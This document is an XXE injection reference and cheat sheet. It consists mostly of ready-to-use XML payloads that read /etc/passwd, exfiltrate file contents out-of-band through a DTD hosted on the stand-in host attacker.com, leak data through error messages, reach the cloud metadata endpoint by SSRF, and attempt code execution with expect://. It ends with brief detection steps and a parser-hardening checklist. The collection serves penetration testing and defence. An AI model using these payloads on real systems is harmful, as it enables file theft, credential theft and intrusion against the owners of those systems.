# XML External Entity (XXE) Injection: 2026 Reference

## Attack Classes

### Classic XXE (In-Band)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Blind XXE (Out-of-Band)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/exfil.dtd">
  %xxe;
]>
<root/>
```
exfil.dtd:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
&exfil;
```

### Blind XXE via Error Messages
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
```

### XXE to SSRF
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

## Protocol/Port Smuggling
```xml
<!ENTITY xxe SYSTEM "expect://id">    <!-- Expect extension RCE -->
<!ENTITY xxe SYSTEM "compress.zlib://file:///etc/passwd">
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
```

## Java XXE
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY xxe2 SYSTEM "jar:file:///path/to/file!/">
]>
```

### Parameter Entities
```xml
<!DOCTYPE foo [
  <!ENTITY % param1 SYSTEM "file:///etc/passwd">
  %param1;
]>
```

## Detection
1. All XML parsers are potential XXE vectors
2. Test with `<!DOCTYPE foo [<!ENTITY xxe "test">]>` — does "test" appear in output?
3. Test with external entity pointing to collaborator
4. Check content types: `application/xml`, `text/xml`, `application/soap+xml`
5. JSON endpoints may accept XML (hidden XML parser)

## Defensive Checklist
1. Disable DOCTYPE entirely: `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`
2. Disable external entities: `setFeature("http://xml.org/sax/features/external-general-entities", false)`
3. Disable parameter entities: `setFeature("http://xml.org/sax/features/external-parameter-entities", false)`
4. Use less complex data format (JSON) when XML not required
5. Upgrade XML parser to latest version